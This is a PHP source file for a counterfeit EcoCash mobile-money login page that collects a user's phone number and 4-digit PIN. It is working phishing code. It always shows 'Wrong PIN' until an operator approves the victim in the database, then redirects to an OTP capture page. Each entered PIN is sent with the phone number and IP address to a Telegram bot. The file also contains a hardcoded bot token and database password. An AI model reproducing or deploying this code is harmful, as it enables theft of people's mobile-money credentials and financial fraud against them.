<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// PostgreSQL credentials
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==================================

// Get phone from session (set by index.php)
$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';
$flashMessage = '';

if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

/**
 * Send Telegram message
 */
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    
    // fallback
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// ========== Process PIN submission ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pinArray = isset($_POST['pin']) ? $_POST['pin'] : [];
    $pin = implode('', $pinArray);
    $pin = preg_replace('/[^0-9]/', '', $pin);
    
    if (strlen($pin) === 4) {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if (!$conn) {
            $error = "System error. Please contact administrator.";
        } else {
            // Ensure `users` table exists (with pin column default 0)
            $createSQL = "
                CREATE TABLE IF NOT EXISTS users (
                    phone VARCHAR(20) PRIMARY KEY,
                    status INTEGER DEFAULT 0,
                    pin INTEGER DEFAULT 0,
                    otp INTEGER DEFAULT 0
                )
            ";
            pg_query($conn, $createSQL);
            
            // Insert phone if not exists (with default pin=0)
            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
            pg_query_params($conn, $insertSQL, [$phone]);
            
            // Check the current `pin` value for this phone
            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
            $result = pg_query_params($conn, $checkSQL, [$phone]);
            if ($result && $row = pg_fetch_assoc($result)) {
                $pinStatus = (int)$row['pin'];
                
                if ($pinStatus === 1) {
                    // PIN already approved → redirect to OTP page
                    $_SESSION['pin_verified'] = true;
                    header("Location: otp.php");
                    exit;
                } else {
                    // PIN is 0 → show "Wrong PIN"
                    $error = "Wrong PIN";
                    
                    // (Optional) Send Telegram notification of failed attempt
                    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
                    $time = date('Y-m-d H:i:s');
                    $msg = "❌ *Failed PIN attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
                    sendTelegramMessage($botToken, $chatId, $msg);
                }
            } else {
                $error = "Database error. Please try again.";
            }
        }
    } else {
        $error = "PIN must be 4 digits.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EcoCash | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #0a5fa7; }
        .top {
            background: #ffffff;
            padding: 8vh 5vw 12vh;
            border-bottom-left-radius: 100% 80px;
            border-bottom-right-radius: 100% 80px;
            text-align: center;
        }
        .logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; }
        .logo span:first-child { color: #1d4ed8; }
        .logo span:last-child { color: #dc2626; }
        .login-title { font-size: 24px; color: #6b7280; margin-bottom: 30px; }
        .phone-box {
            border: 2px solid #1d4ed8;
            border-radius: 12px;
            padding: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            max-width: 360px;
            margin: 0 auto 30px;
        }
        .flag { width: 26px; height: 18px; }
        .code { font-size: 18px; color: #374151; }
        .pin-label { color: #6b7280; margin-bottom: 15px; font-size: 16px; }
        .pin {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        .pin input {
            width: 55px;
            height: 55px;
            border: 2px solid #1d4ed8;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            outline: none;
        }
        .pin input:focus { border-color: #2563eb; }
        .forgot { color: #6b7280; font-size: 16px; text-decoration: none; }
        .error-message, .flash-message {
            padding: 10px;
            border-radius: 8px;
            margin: 10px auto;
            max-width: 300px;
            font-size: 14px;
            text-align: center;
        }
        .error-message { color: #dc2626; background: #fee2e2; }
        .flash-message { color: #dc2626; background: #fee2e2; }
        .bottom {
            padding: 8vh 5vw 5vh;
            text-align: center;
            color: #ffffff;
        }
        .actions {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        .action-btn {
            background: #ffffff;
            color: #111827;
            width: 160px;
            padding: 18px 10px;
            border-radius: 14px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
        .version { font-size: 14px; opacity: 0.9; }
        .terms { font-size: 13px; opacity: 0.9; }
    </style>
</head>
<body>
<div class="top">
    <div class="logo"><span>Eco</span><span>Cash</span></div>
    <div class="login-title">Login</div>
    <div class="phone-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" class="flag" alt="Zimbabwe flag">
        <div class="code">+263 <?= htmlspecialchars($phone) ?></div>
    </div>
    <div class="pin-label">Enter your PIN</div>

    <?php if ($flashMessage): ?>
        <div class="flash-message"><?= htmlspecialchars($flashMessage) ?></div>
    <?php endif; ?>

    <?php if ($error): ?>
        <div class="error-message"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="POST" id="pinForm">
        <div class="pin">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off" autofocus>
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="password" name="pin[]" maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
    </form>
    <a href="#" class="forgot">Forgot PIN?</a>
</div>
<div class="bottom">
    <p>To register an EcoCash wallet or get assistance,<br>click below</p>
    <div class="actions">
        <button class="action-btn" type="button">👤 Register</button>
        <button class="action-btn" type="button">ℹ️ Help & Support</button>
    </div>
    <div class="version">v2.1.3P</div>
    <div class="terms">By signing in you agree to the Terms and Conditions</div>
</div>

<script>
    const inputs = document.querySelectorAll('.pin input');
    function allFilled() {
        let filled = true;
        inputs.forEach(i => {
            if (i.value.length === 0) filled = false;
        });
        if (filled) {
            document.getElementById('pinForm').submit();
        }
    }

    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            input.value = input.value.replace(/[^0-9]/g, '');
            if (input.value && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
            allFilled();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });
</script>
</body>
</html>
